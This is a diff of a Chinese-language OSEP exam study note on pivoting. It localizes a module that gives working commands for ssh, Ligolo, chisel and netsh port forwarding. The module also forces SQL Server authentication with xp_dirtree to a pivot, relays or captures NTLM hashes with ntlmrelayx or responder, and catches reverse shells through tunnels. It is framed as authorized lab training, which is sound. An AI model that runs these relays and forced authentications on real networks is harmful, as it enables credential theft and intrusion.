@@ -1,12 +1,8 @@
-::: warning Authorized use only
-For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
+::: warning 仅限授权使用
+本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
 :::
 
-# Module 08 — Pivoting
-
-Forward access is not a callback path. Put listeners on the pivot the target can reach.
-
-Switch to **中文** in the header for the original full narrative. Lab listings on this page are complete.
+# 08 · 隧道与端口转发（Pivoting & Tunneling）
 
 > 场景 34–35。横向移动的核心：**内网可达性 ≠ 你的可达性**，两条方向要分开想。
 > 配套脚本：`m08-ligolo-ng-setup.sh`、`m08-chisel-socks.sh`、`m08-port-forward.ps1`。
@@ -36,13 +32,13 @@ Switch to **中文** in the header for the original full narrative. Lab listings
 
 **场景 35 的本质**：SOCKS 代理只承载 **Kali 发起的**连接。目标进程（SQL `xp_dirtree`、反向 shell、认证回调）发起连接时走的是**目标自己的路由**，SOCKS 帮不上忙——必须在目标可达的那台机器上开一个接收口，把连接通过隧道送回 Kali 的监听器。
 
-**端口与地址纪律**：所有阶段使用同一份地址/端口规划（见 `docs/00` 端口表，11601=Ligolo 代理、1080=SOCKS、8081=内网站点示例端口）；改动任一参数后立刻用无害连接Verify，不要假设。
+**端口与地址纪律**：所有阶段使用同一份地址/端口规划（见 `docs/00` 端口表，11601=Ligolo 代理、1080=SOCKS、8081=内网站点示例端口）；改动任一参数后立刻用无害连接验证，不要假设。
 
 ---
 
 ## 3. 场景 34：内部网站只接受来自指定网段的访问
 
-### Scenario回顾
+### 场景回顾
 Kali 直连内部网站被拒绝（ACL 只放行指定网段），但已控的一台 DEV 网主机能访问该网站；网站（示例 web06:8081）后面还有上传或命令执行入口，最终目的是拿到入口并回连。
 
 ### 前提与假设
@@ -50,7 +46,7 @@ Kali 直连内部网站被拒绝（ACL 只放行指定网段），但已控的�
 - 内部网站 IP 已知（例 `172.16.X.50:8081`），且只允许 DEV 所在网段访问。
 - 网站上的上传/命令执行目标（web 主机）**不一定能回连 Kali**，回连目标要按它可达的路径设计（通常 = DEV 主机或 DEV 网段内你开的接收口）。
 
-### 准备（attacker box侧）
+### 准备（攻击机侧）
 ```bash
 # 预放行：本地端口 8081（转发端口）、1080（SOCKS）、11601（ligolo）
 mkdir -p ~/osep/tools ~/osep/logs
@@ -87,7 +83,7 @@ curl http://240.0.0.1:8081/
 
 方案 C：chisel（DEV 能执行 chisel client）——见 `m08-chisel-socks.sh`。
 
-**Step 2 · Verify内网站点可达 + 找上传/命令执行入口**：
+**Step 2 · 验证内网站点可达 + 找上传/命令执行入口**：
 ```bash
 curl -s http://127.0.0.1:8081/ -o /dev/null -w '%{http_code}\n'   # 期望 200/302
 # 后续上传/命令执行交互都走这条已通的路径，不要换回 Kali 直连地址
@@ -111,7 +107,7 @@ Windows 形态的 DEV 跳板也能用 `m08-port-forward.ps1` 的 portproxy 做�
 - `m08-chisel-socks.sh`（备选转发 + proxychains）
 - `m08-port-forward.ps1`（DEV 是 Windows 时的 netsh portproxy）
 
-### Verify
+### 验证
 1. `curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8081/` 返回非拒绝状态码。
 2. 在网站入口执行无害回连（如 `nc <DEV_IP> 4445` / 触发一次下载）确认整条链路，再上真 payload。
 3. 回连拿到 shell 后立即 `whoami`、`ipconfig /all`——确认拿到的是 **web 主机**而非跳板。
@@ -119,13 +115,13 @@ Windows 形态的 DEV 跳板也能用 `m08-port-forward.ps1` 的 portproxy 做�
 ### 失败分支与备选
 1. **8081 本地端口被占** → 换 `127.0.0.1:18081`，URL 同步改，别抢 11601/1080。
 2. **ssh 方案不通（无凭据/防火墙）** → 切 Ligolo 或 chisel，只要 DEV 能执行 agent 即可，不依赖 SSH 服务。
-3. **网站还连不上** → 在 DEV 上先 `curl` Verify网站真可达；可能是 ACL 细化到端口/协议，换 http→https 或换目标端口试试。
+3. **网站还连不上** → 在 DEV 上先 `curl` 验证网站真可达；可能是 ACL 细化到端口/协议，换 http→https 或换目标端口试试。
 4. **回连 payload 到不了 DEV:4445** → 先用无害 TCP 测试（网站侧 `nc` 或命令注入 `ping`）确认 web→DEV 通路；不通就在 DEV 同网段再放一个 agent/listener 作中继。
 
 ### 考试注意 OPSEC
 - Ligolo 用 `-selfcert`（明文通道）：考试环境可接受，别浪费时间做证书；但**生产/报告不要提加密**。
 - 每个转发端口只开一个监听；用 `listener_list` / `ss -tlnp` 确认没有重复占用。
-- 先无害Verify再上 payload——端口转发链路里少一个Verify，错误会叠加（地址错 + 端口错 + 协议错一起排查最费时）。
+- 先无害验证再上 payload——端口转发链路里少一个验证，错误会叠加（地址错 + 端口错 + 协议错一起排查最费时）。
 
 ---
 
@@ -452,7 +448,7 @@ switch ($Mode) {
 
 ## 4. 场景 35：代理能连接内网目标，但目标主动认证到不了你的监听端
 
-### Scenario回顾
+### 场景回顾
 你可以经 SOCKS 访问内网 SQL 或域服务（正向 OK），但触发目标**主动连接**（SQL 认证/中继、NTLM 回连）时没有任何认证到达监听端。正向访问与目标回连是两条不同路径（依据：C4 SQL 认证与中继场景）。
 
 ### 前提与假设
@@ -460,7 +456,7 @@ switch ($Mode) {
 - 目标（SQL Server、域主机）进程能主动外连到**同一网段内某台机器**，但**到不了 Kali**（防火墙/ACL/分段）。
 - 你控制一台目标网段内的机器（Ligolo agent / Windows 跳板），或在目标网段内有可执行文件的位置。
 
-### 准备（attacker box侧）
+### 准备（攻击机侧）
 ```bash
 # Kali：认证接收端 + 中继工具就位（root 运行，SMB 445 需要特权）
 sudo systemctl stop smbd   # 先释放 445，否则 responder/ntlmrelayx 起不来
@@ -484,7 +480,7 @@ listener_list
 ```sql
 -- 目标 SQL 上触发对外 SMB 认证（示例：UNC 目录列举）
 EXEC master..xp_dirtree '\\<AGENT_INTERNAL_IP>\share';
--- 或 xp_subdirs / xp_fileexist；低权限 SQL 也常能触发（见 [11-mssql](/modules/11-mssql)）
+-- 或 xp_subdirs / xp_fileexist；低权限 SQL 也常能触发（见 [11-mssql](/zh/modules/11-mssql)）
 ```
 认证包：目标 → `<AGENT_INTERNAL_IP>:445` → Ligolo 隧道 → Kali 127.0.0.1:445（ntlmrelayx/responder）。到达即中继或落盘哈希。
 
@@ -492,7 +488,7 @@ EXEC master..xp_dirtree '\\<AGENT_INTERNAL_IP>\share';
 ```powershell
 # 在 Windows 跳板（管理员）执行：监听跳板 445 → 转发到 Kali 的 ntlmrelayx
 netsh interface portproxy add v4tov4 listenport=445 listenaddress=<PIVOT_IP> connectport=445 connectaddress=<KALI_IP>
-# 触发参数改成 \\<PIVOT_IP>\share；Verify：netsh interface portproxy show all
+# 触发参数改成 \\<PIVOT_IP>\share；验证：netsh interface portproxy show all
 ```
 前提：跳板→Kali:445 出网放行（agent/beacon 能出网通常意味着行）；目标→跳板:445 放行。
 
@@ -506,9 +502,9 @@ ssh -N -R 0.0.0.0:445:127.0.0.1:445 USER@PIVOT_IP
 ### 用到的脚本
 - `m08-ligolo-ng-setup.sh`（reverse 子命令，反连转发的标准模板）
 - `m08-port-forward.ps1`（Windows 跳板 portproxy，含回滚/清理）
-- 触发侧模板见 [11-mssql](/modules/11-mssql) 与 [16-ics-calendar](/modules/16-ics-calendar)（认证触发手段）
+- 触发侧模板见 [11-mssql](/zh/modules/11-mssql) 与 [16-ics-calendar](/zh/modules/16-ics-calendar)（认证触发手段）
 
-### Verify
+### 验证
 1. `listener_list` 确认 listener 已加；`ss -tlnp` 确认 Kali 上 445/目标端口真在监听。
 2. 触发后 ntlmrelayx/responder 打印认证来源 IP——应为**目标/中继方**，不是 Kali 自身。
 3. 中继成功判定：目标主机上执行命令/拿到会话；只捕获哈希时确认 hash 格式与后续破解工具匹配。
@@ -521,7 +517,7 @@ ssh -N -R 0.0.0.0:445:127.0.0.1:445 USER@PIVOT_IP
 
 ### 考试注意 OPSEC
 - 触发**一次**认证就够，别反复触发制造噪声；每次触发前确认监听已就位。
-- SMB/HTTP 中继要求目标与中继**同网段且不开 SMB 签名**（可先探测）；EPA/签名等条件见 [12-ad-attacks](/modules/12-ad-attacks) ESC8 与 [16-ics-calendar](/modules/16-ics-calendar)。
+- SMB/HTTP 中继要求目标与中继**同网段且不开 SMB 签名**（可先探测）；EPA/签名等条件见 [12-ad-attacks](/zh/modules/12-ad-attacks) ESC8 与 [16-ics-calendar](/zh/modules/16-ics-calendar)。
 - 地址一致性铁律：触发参数里的 IP 永远是"目标可达的那台机"，端口永远是"那条隧道在目标侧开的端口"，两者都要在笔记里写清并复现。
 
 ---
@@ -554,8 +550,8 @@ sudo sshuttle -v -e "ssh -i id_rsa" -r USER@PIVOT_IP 172.16.X.0/24
 
 | 文档 | 内容 |
 |---|---|
-| [00-environment-and-infra](/modules/00-environment-and-infra) | 端口规划（11601/1080/8081…）、日志纪律 |
-| [11-mssql](/modules/11-mssql) | 场景 35 的认证触发手段（xp_dirtree 等） |
-| [16-ics-calendar](/modules/16-ics-calendar) | 外部触发认证的另一种形态 |
-| [09-c2-egress-channels](/modules/09-c2-egress-channels) | 出网通道与"全阶段同路径"原则 |
+| [00-environment-and-infra](/zh/modules/00-environment-and-infra) | 端口规划（11601/1080/8081…）、日志纪律 |
+| [11-mssql](/zh/modules/11-mssql) | 场景 35 的认证触发手段（xp_dirtree 等） |
+| [16-ics-calendar](/zh/modules/16-ics-calendar) | 外部触发认证的另一种形态 |
+| [09-c2-egress-channels](/zh/modules/09-c2-egress-channels) | 出网通道与"全阶段同路径"原则 |
 | `m08-ligolo-ng-setup.sh` 等 | 本模块脚本用法 |
